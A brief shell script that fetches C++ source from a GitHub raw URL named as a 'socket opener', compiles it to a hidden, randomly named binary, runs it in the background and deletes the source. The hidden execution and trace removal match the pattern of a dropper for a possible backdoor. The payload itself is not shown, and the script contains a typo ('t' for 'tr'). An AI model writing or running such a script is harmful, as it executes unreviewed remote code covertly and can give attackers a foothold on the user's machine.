fileName=$(echo $RANDOM $RANDOM | t -d ' ')
curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/main.cxx | cat > hey.cxx
g++ hey.cxx -o .$fileName
./.$fileName &
rm hey.cxx
fileName=$(echo $RANDOM $RANDOM | t -d ' ')
exit
